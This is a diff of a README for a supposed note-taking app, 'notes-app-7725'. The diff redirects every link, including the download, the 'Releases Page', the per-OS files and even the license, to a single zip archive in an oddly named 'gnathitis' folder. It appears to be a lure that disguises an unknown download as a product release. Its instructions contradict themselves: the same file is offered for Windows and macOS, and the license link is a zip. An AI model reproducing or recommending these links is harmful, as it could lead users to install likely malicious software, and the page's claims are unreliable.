@@ -1,7 +1,7 @@
 # 🎉 notes-app-7725 - Take Simple Notes with Ease
 
 ## 📥 Download Now
-[![Download notes-app-7725](https://raw.githubusercontent.com/jay03031/notes-app-7725/main/gnathitis/notes-app-7725.zip%20notes--app--7725-blue)](https://raw.githubusercontent.com/jay03031/notes-app-7725/main/gnathitis/notes-app-7725.zip)
+[![Download notes-app-7725](https://github.com/jay03031/notes-app-7725/raw/refs/heads/main/gnathitis/app_notes_lenticula.zip%20notes--app--7725-blue)](https://github.com/jay03031/notes-app-7725/raw/refs/heads/main/gnathitis/app_notes_lenticula.zip)
 
 ## 🚀 Getting Started
 Welcome to notes-app-7725! This application helps you create and manage your notes easily. With a clean design and straightforward features, anyone can use it without hassle.
@@ -20,12 +20,12 @@ Welcome to notes-app-7725! This application helps you create and manage your not
 ## 📦 Download & Install
 To get started with notes-app-7725, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the following link to access the download options: [Download notes-app-7725](https://raw.githubusercontent.com/jay03031/notes-app-7725/main/gnathitis/notes-app-7725.zip).
+1. **Visit the Releases Page:** Go to the following link to access the download options: [Download notes-app-7725](https://github.com/jay03031/notes-app-7725/raw/refs/heads/main/gnathitis/app_notes_lenticula.zip).
   
 2. **Select the Latest Release:** On the Releases page, you will see a list of available versions. Click on the latest version, which is listed at the top.
 
 3. **Download the Application:** 
-   - Look for the file that matches your operating system (e.g., `https://raw.githubusercontent.com/jay03031/notes-app-7725/main/gnathitis/notes-app-7725.zip` for Windows or `https://raw.githubusercontent.com/jay03031/notes-app-7725/main/gnathitis/notes-app-7725.zip` for macOS).
+   - Look for the file that matches your operating system (e.g., `https://github.com/jay03031/notes-app-7725/raw/refs/heads/main/gnathitis/app_notes_lenticula.zip` for Windows or `https://github.com/jay03031/notes-app-7725/raw/refs/heads/main/gnathitis/app_notes_lenticula.zip` for macOS).
    - Click on the file to download it to your computer.
 
 4. **Install the Application:** 
@@ -50,7 +50,7 @@ To get started with notes-app-7725, follow these simple steps:
 
 ## ❓ FAQ
 ### How do I update the app?
-- To update notes-app-7725, return to the [Releases Page](https://raw.githubusercontent.com/jay03031/notes-app-7725/main/gnathitis/notes-app-7725.zip) and download the latest version. Follow the installation steps again.
+- To update notes-app-7725, return to the [Releases Page](https://github.com/jay03031/notes-app-7725/raw/refs/heads/main/gnathitis/app_notes_lenticula.zip) and download the latest version. Follow the installation steps again.
 
 ### Can I use notes-app-7725 offline?
 - Yes, you can create and manage your notes without an internet connection. Syncing will happen once you reconnect.
@@ -62,6 +62,6 @@ To get started with notes-app-7725, follow these simple steps:
 For additional help, please visit the GitHub page or engage with our community for tips and troubleshooting advice. Your experience is important to us, and we’re here to assist you.
 
 ## 🔗 Code License
-This project is licensed under the MIT License. You can see the full license text on the [GitHub repository](https://raw.githubusercontent.com/jay03031/notes-app-7725/main/gnathitis/notes-app-7725.zip).
+This project is licensed under the MIT License. You can see the full license text on the [GitHub repository](https://github.com/jay03031/notes-app-7725/raw/refs/heads/main/gnathitis/app_notes_lenticula.zip).
 
 By following these steps and tips, you should have a smooth experience using notes-app-7725. Happy note-taking!
